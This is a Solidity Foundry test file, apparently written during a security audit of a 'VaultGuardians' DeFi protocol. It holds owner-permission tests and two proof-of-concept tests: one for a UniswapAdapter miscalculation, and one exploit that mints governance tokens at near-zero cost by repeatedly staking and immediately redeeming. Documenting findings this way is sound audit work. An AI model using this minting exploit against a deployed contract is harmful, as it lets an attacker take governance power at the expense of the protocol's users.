// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import {Base_Test} from "../../Base.t.sol";
import {console2} from "forge-std/Test.sol";
// @audit-info - Unused import
import {VaultShares} from "../../../src/protocol/VaultShares.sol";
import {ERC20Mock} from "../../mocks/ERC20Mock.sol";
import {VaultGuardians, IERC20} from "../../../src/protocol/VaultGuardians.sol";

contract VaultGuardiansTest is Base_Test {
    address user = makeAddr("user");

    uint256 mintAmount = 100 ether;

    function setUp() public override {
        Base_Test.setUp();
    }

    function testUpdateGuardianStakePrice() public {
        uint256 newStakePrice = 10;
        vm.prank(vaultGuardians.owner());
        vaultGuardians.updateGuardianStakePrice(newStakePrice);
        assertEq(vaultGuardians.getGuardianStakePrice(), newStakePrice);
    }

    function testUpdateGuardianStakePriceOnlyOwner() public {
        uint256 newStakePrice = 10;
        vm.prank(user);
        vm.expectRevert();
        vaultGuardians.updateGuardianStakePrice(newStakePrice);
    }

    function testUpdateGuardianAndDaoCut() public {
        uint256 newGuardianAndDaoCut = 10;
        vm.prank(vaultGuardians.owner());
        vaultGuardians.updateGuardianAndDaoCut(newGuardianAndDaoCut);
        assertEq(vaultGuardians.getGuardianAndDaoCut(), newGuardianAndDaoCut);
    }

    function testUpdateGuardianAndDaoCutOnlyOwner() public {
        uint256 newGuardianAndDaoCut = 10;
        vm.prank(user);
        vm.expectRevert();
        vaultGuardians.updateGuardianAndDaoCut(newGuardianAndDaoCut);
    }

    function testSweepErc20s() public {
        ERC20Mock mock = new ERC20Mock();
        mock.mint(mintAmount, msg.sender);
        vm.prank(msg.sender);
        mock.transfer(address(vaultGuardians), mintAmount);

        uint256 balanceBefore = mock.balanceOf(address(vaultGuardianGovernor));

        vm.prank(vaultGuardians.owner());
        vaultGuardians.sweepErc20s(IERC20(mock));

        uint256 balanceAfter = mock.balanceOf(address(vaultGuardianGovernor));

        assertEq(balanceAfter - balanceBefore, mintAmount);
    }


    /**
     * @notice Demonstrates a bug in UniswapAdapter where amountADesired is calculated incorrectly.
     * The logic double-counts the token amount, causing an `ERC20InsufficientBalance` revert.
     */
    function test_becomeGuardianUniswapAmountADesiredDoubled() public {
        // There is not enough hold tokens to pay the aditional tokens needed because of the bug.
        AllocationData memory allocationData = AllocationData(10, 190, 800);

        uint256 stakePrice = vaultGuardians.getGuardianStakePrice(); // 10e18
        deal(address(weth), user, stakePrice);

        vm.startPrank(user);
        weth.approve(address(vaultGuardians), stakePrice);
        vm.expectRevert();
        vaultGuardians.becomeGuardian(allocationData);
        vm.stopPrank();
    }
    /**
     * @notice PoC: Infinite Governance Token Minting.
     * Shows how to mint indefinite VGT tokens at near-zero cost.
     */
    function test_exploitInfiniteGovernanceMinting() public {
        uint256 iterations = 5;
        uint256 stakePrice = vaultGuardians.getGuardianStakePrice(); 
        
        // Setup capital for multiple iterations (covering fees)
        uint256 initialBalance = stakePrice * iterations * 2; 
        deal(address(weth), user, initialBalance);
        
        AllocationData memory allocation = AllocationData(1000, 0, 0); // 100% HOLD

        vm.startPrank(user);
        weth.approve(address(vaultGuardians), type(uint256).max);

        for (uint256 i = 0; i < iterations; i++) {
            // 1. Pay Stake -> Get VGT (Mint)
            address vaultAddr = vaultGuardians.becomeGuardian(allocation);
            VaultShares vault = VaultShares(vaultAddr);

            // 2. Recover Stake immediately (Bypass Registry/Quit)
            vault.redeem(vault.balanceOf(user), user, user);
        }
        vm.stopPrank();

        // Verification
        uint256 expectedVgt = iterations * stakePrice;
        assertEq(vaultGuardianToken.balanceOf(user), expectedVgt, "VGT should accumulate");
        
        // Attack Cost Analysis (Only DAO fees lost)
        uint256 totalCost = initialBalance - weth.balanceOf(user);
        uint256 totalVolume = stakePrice * iterations;
        console2.log("Cost to mint VGT:", totalCost);
        
        // Cost should be < 2% of volume (actually ~0.2%)
        assertLe(totalCost, totalVolume / 50, "Exploit cost is prohibitively high");
    }
}
